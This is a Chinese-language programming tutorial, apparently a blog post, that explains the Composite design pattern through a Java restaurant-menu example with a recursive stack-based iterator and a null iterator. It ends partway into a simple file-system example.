&lt;p&gt;整体结构如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/682679/201903/682679-20190303210533482-389663141.png&quot; alt=&quot;&quot; width=&quot;942&quot; height=&quot;348&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面创建菜单&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MenuTestDrive {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String args[]) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建所有的菜单系统，它们本质上都是组合节点——MenuComponent&lt;/span&gt;
        MenuComponent pancakeHouseMenu = &lt;span&gt;new&lt;/span&gt; Menu(&quot;PANCAKE HOUSE MENU&quot;, &quot;Breakfast&quot;&lt;span&gt;);
        MenuComponent dinerMenu &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Menu(&quot;DINER MENU&quot;, &quot;Lunch&quot;&lt;span&gt;);
        MenuComponent cafeMenu &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Menu(&quot;CAFE MENU&quot;, &quot;Dinner&quot;&lt;span&gt;);
        MenuComponent dessertMenu &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Menu(&quot;DESSERT MENU&quot;, &quot;Dessert of course!&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建顶级root节点——allMenus，代表整个菜单系统&lt;/span&gt;
        MenuComponent allMenus = &lt;span&gt;new&lt;/span&gt; Menu(&quot;ALL MENUS&quot;, &quot;All menus combined&quot;&lt;span&gt;);
        allMenus.add(pancakeHouseMenu); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把每个菜单系统，组合到root节点，当做树枝节点&lt;/span&gt;
&lt;span&gt;        allMenus.add(dinerMenu);
        allMenus.add(cafeMenu);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为煎饼屋的菜单系统，增加菜单项&lt;/span&gt;
        pancakeHouseMenu.add(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(
                &lt;/span&gt;&quot;K&amp;amp;B's Pancake Breakfast&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;Pancakes with scrambled eggs, and toast&quot;&lt;span&gt;));&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为餐厅的菜单系统，增加菜单项&lt;/span&gt;
        dinerMenu.add(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(&lt;/span&gt;&quot;Vegetarian BLT&quot;&lt;span&gt;, &lt;/span&gt;&quot;(Fakin') Bacon with lettuce &amp;amp; tomato on whole wheat&quot;&lt;span&gt;));
        dinerMenu.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(&lt;/span&gt;&quot;BLT&quot;&lt;span&gt;, &lt;/span&gt;&quot;Bacon with lettuce &amp;amp; tomato on whole wheat&quot;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为餐厅的菜单系统，增加子菜单——这个其实也是菜单项，但是，是树枝，这是一个饭后甜点子菜单&lt;/span&gt;
&lt;span&gt;        dinerMenu.add(dessertMenu);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为饭后甜点菜单系统，增加菜单项&lt;/span&gt;
        dessertMenu.add(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(&lt;/span&gt;&quot;Apple Pie&quot;&lt;span&gt;, &lt;/span&gt;&quot;Apple pie with a flakey crust, topped with vanilla icecream&quot;&lt;span&gt;));
        dessertMenu.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(&lt;/span&gt;&quot;Cheesecake&quot;&lt;span&gt;, &lt;/span&gt;&quot;Creamy New York cheesecake, with a chocolate graham crust&quot;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为咖啡厅菜单系统，增加菜单项&lt;/span&gt;
        cafeMenu.add(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(
                &lt;/span&gt;&quot;Veggie Burger and Air Fries&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;Veggie burger on a whole wheat bun, lettuce, tomato, and fries&quot;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把整个菜单传给客户端&lt;/span&gt;
        Waitress waitress = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Waitress(allMenus);
        waitress.printMenu();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;这是一个很典型的折中设计问题：有时候会故意违反一些设计原则，去实现一些特殊需求。还是那句话，学习设计模式不要死记硬背，最后还是要遵循具体的技术条件和&lt;/strong&gt;服务于特定的&lt;/span&gt;业务场景。&lt;/p&gt;
&lt;p&gt;回顾案例发现：组合模式不但要管理整个菜单——这个树状层次结构，还要执行菜单的一些具体操作动作。明显的，违反了单一职责原则，可以这么说：组合模式牺牲了单一职责的设计原则，换取了程序的透明性（transparency）——通过让组件的接口同时包含一些树枝子节点（组合节点）和叶子子节点的操作，客户就可以将组合节点和叶子节点一视同仁，而一个元素究竟是组合节点还是叶子节点对客户都是透明的。&lt;/p&gt;
&lt;p&gt;如果不让组件接口同时具备多种类型节点的操作，虽然设计上安全，职责也分开，但是失去了透明性，即客户端必须显示的使用条件（一般用 instanceOf ）来判断节点类型&lt;/p&gt;

&lt;p&gt;可让客户端使用迭代器模式去遍历整个菜单系统，比方说，女招待可能想要游走整个菜单，只打印 / 挑选素食的菜单项。&lt;/p&gt;
&lt;p&gt;想要实现一个组合模式+迭代器模型的菜单系统，可以为每个组件都加上 createIterator() 方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 先从抽象的组件节点入手，加上迭代器
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add(MenuComponent menuComponent) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove(MenuComponent menuComponent) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; MenuComponent getChild(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; getPrice() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isVegetarian() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 加上迭代器，这里直接使用 JDK 的迭代器&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt;&lt;span&gt; Iterator createIterator();

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;同样的套路，编写叶子节点和树枝节点，继承这个抽象类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Menu &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; List&amp;lt;MenuComponent&amp;gt; menuComponents = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String description;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Menu(String name, String description) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.description =&lt;span&gt; description;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add(MenuComponent menuComponent) {
        menuComponents.add(menuComponent);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove(MenuComponent menuComponent) {
        menuComponents.remove(menuComponent);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; MenuComponent getChild(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; menuComponents.get(i);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; name;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; description;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Iterator createIterator() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; CompositeIterator(menuComponents.iterator());
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {&lt;/span&gt;&lt;span&gt;
        Iterator iterator &lt;/span&gt;=&lt;span&gt; menuComponents.iterator();
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iterator.hasNext()) {
            MenuComponent menuComponent &lt;/span&gt;=&lt;span&gt; (MenuComponent) iterator.next();
            menuComponent.print();
        }
    }
}
 
&lt;/span&gt;&lt;span&gt;//////////////////////
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;
&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MenuItem &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String description;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; vegetarian;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; price;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; MenuItem(String name, String description, &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; vegetarian, &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; price) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.description =&lt;span&gt; description;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.vegetarian =&lt;span&gt; vegetarian;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.price =&lt;span&gt; price;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; name;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; description;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; getPrice() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; price;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isVegetarian() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; vegetarian;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Iterator createIterator() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NullIterator();
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {
        System.out.print(&lt;/span&gt;&quot;  &quot; +&lt;span&gt; getName());
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isVegetarian()) {
            System.out.print(&lt;/span&gt;&quot;(vegetable)&quot;&lt;span&gt;);
        }
        System.out.println(&lt;/span&gt;&quot;, &quot; +&lt;span&gt; getPrice());
        System.out.println(&lt;/span&gt;&quot;     -- &quot; +&lt;span&gt; getDescription());
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;发现了两个新东西，一个是 NullIterator() 和 CompositeIterator()，尤其是后者，使用了递归思想。&lt;/p&gt;
&lt;p&gt;回忆：在写 MenuComponent 类的 print 方法时，利用了一个迭代器遍历组件内的每个项，如果遇到的是菜单，就会递归地调度 print 方法处理它，换句话说，MenuComponent 是在“内部”自行处理遍历——内部迭代器模式。&lt;/p&gt;
&lt;p&gt;但是在如下的 CompositeIterator 中，实现的是一个“外部”的迭代器，所以有许多需要追踪的事情。外部迭代器必须维护它在遍历中的位置，以便外部可以通过 hasNext 和 next 来驱动遍历。在 CompositeIterator 中，必须维护组合递归结构的位置，这也是为什么在组合层次结构中上上下下时，使用堆栈 JDK 的 Stack 来维护游标的位置。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Stack;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 自定义组合模式的组合节点的专属迭代器 CompositeIterator
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CompositeIterator &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Iterator {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; Stack&amp;lt;Iterator&amp;gt; stack = &lt;span&gt;new&lt;/span&gt; Stack&amp;lt;&amp;gt;&lt;span&gt;();

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把要遍历的 Menu 组合的迭代器 iterator 传入，menuComponents.iterator() 被传入一个 stack 中保存位置&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; CompositeIterator(Iterator iterator) {
        stack.push(iterator);
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当客户端需要取得下一个元素的时候，先判断是否存在下一个元素&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object next() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (hasNext()) {
            Iterator iterator &lt;/span&gt;= stack.peek(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 仅查看当前的栈顶元素——迭代器，不出栈&lt;/span&gt;
            MenuComponent component = (MenuComponent) iterator.next(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用该栈顶的迭代器，取出要遍历的组合的元素&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (component &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; Menu) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果取出的元素仍然是菜单，那需要继续遍历它，故要记录它的位置，把它的迭代器取出来 
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用 component.createIterator() 返回 CompositeIterator，这个 CompositeIterator 仍然包含一个自己的 stack，继续存入栈中&lt;/span&gt;
&lt;span&gt;                stack.push(component.createIterator()); 
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; component;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasNext() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (stack.empty()) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果栈是空，直接返回 false&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            Iterator iterator &lt;/span&gt;= stack.peek(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 仅查看当前的栈顶元素——迭代器，不出栈
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断当前的顶层元素是否还有下一个元素，如果栈空了，就说明当前顶层元素没有下一个元素，返回 false，此处判断为 true&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;iterator.hasNext()) {
                stack.pop(); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果当前栈顶元素，没有下一个元素了，就把当前栈顶元素出栈，递归的继续判断下一个元素&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt; hasNext();
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 否则表示还有下一个元素，直接返回 true&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考 &lt;a class=&quot;ct-link&quot; title=&quot;java.util.Stack类中的peek()方法&quot; href=&quot;http://www.cnblogs.com/jose1125/p/5294972.html&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;java.util.Stack类中的peek()方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过测试，来观察上述代码的执行过程：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestCompositeStack {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        MenuComponent pancakeHouseMenu &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Menu(&quot;PANCAKE HOUSE MENU&quot;, &quot;Breakfast&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建顶级root节点——allMenus，代表整个菜单系统&lt;/span&gt;
        MenuComponent allMenus = &lt;span&gt;new&lt;/span&gt; Menu(&quot;ALL MENUS&quot;, &quot;All menus combined&quot;&lt;span&gt;);
        allMenus.add(pancakeHouseMenu); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把菜单系统，组合到root节点，当做树枝节点

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为煎饼小屋的菜单系统，增加菜单项&lt;/span&gt;
        pancakeHouseMenu.add(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(
                &lt;/span&gt;&quot;K&amp;amp;B's Pancake Breakfast&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;Pancakes with scrambled eggs, and toast&quot;&lt;span&gt;));
        pancakeHouseMenu.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; MenuItem(
                &lt;/span&gt;&quot;Regular Pancake Breakfast&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;Pancakes with fried eggs, sausage&quot;&lt;span&gt;));
        testStack(allMenus);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testStack(MenuComponent menuComponent) {
        CompositeIterator compositeIterator &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; CompositeIterator(menuComponent.createIterator());
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (compositeIterator.hasNext()) {
            MenuComponent menuComponent1 &lt;/span&gt;=&lt;span&gt; (MenuComponent) compositeIterator.next();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;5.1、空迭代器&lt;/h2&gt;
&lt;p&gt; 如果菜单项没什么可以遍历的，比如叶子节点，那么一般要给其遍历方法：&lt;/p&gt;
&lt;p&gt; 1、返回 null。可以让 createIterator() 方法返回 null，但是如果这么做，客户端的代码就需要条件语句来判断返回值是否为 null，不太好；&lt;/p&gt;
&lt;p&gt; 2、返回一个迭代器，而这个迭代器的 hasNext() 永远返回 false。这个是更好的方案，客户端不用再担心返回值是否为 null。等于创建了一个迭代器，其作用是“没作用”。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 自定义组合模式的叶子节点的专属迭代器
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; NullIterator &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Iterator {

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object next() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasNext() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;客户端代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;
&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Waitress {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; MenuComponent allMenus;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Waitress(MenuComponent allMenus) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.allMenus =&lt;span&gt; allMenus;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; printMenu() {
        allMenus.print();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; printVegetarianMenu() {
        Iterator iterator &lt;/span&gt;=&lt;span&gt; allMenus.createIterator();&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iterator.hasNext()) {
            MenuComponent menuComponent &lt;/span&gt;= &lt;span&gt;(MenuComponent) iterator.next();
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (menuComponent.isVegetarian()) {
                    menuComponent.print();
                }
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (UnsupportedOperationException ignored) {
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;有时候，如果组合的结构非常复杂，或者遍历的代价很大，那么可以为组合节点实现一个缓存，如果业务需求是需要不断的遍历一个组合结构，那么可以把遍历的节点存入缓存，省去每次都递归遍历的开支。&lt;/p&gt;

&lt;p&gt;组合模式包含有个体对象和组合对象，并形成树形结构，使用户可以方便地处理个体对象和组合对象。&lt;/p&gt;
&lt;p&gt;1、组合对象和个体对象实现了相同的接口，用户一般不需区分个体对象和组合对象。&lt;/p&gt;
&lt;p&gt;2、当增加新的Composite节点和Leaf节点时，用户的重要代码不需要作出修改。&lt;/p&gt;

&lt;p&gt;下面使用接口来基于组合模式，实现简单的文件系统&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
 * 文件节点抽象(是文件和目录的父类)
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IFile {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示文件或者文件夹的名称&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; display();&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; add(IFile file);&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; remove(IFile file);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获得子节点&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; List&amp;lt;IFile&amp;gt;&lt;span&gt; getChild();
}
 
&lt;/span&gt;&lt;span&gt;//////////////////////////&lt;/span&gt;&lt;span&gt;/ 文件节点&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; File &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; IFile {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; File(String name) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
    }
    
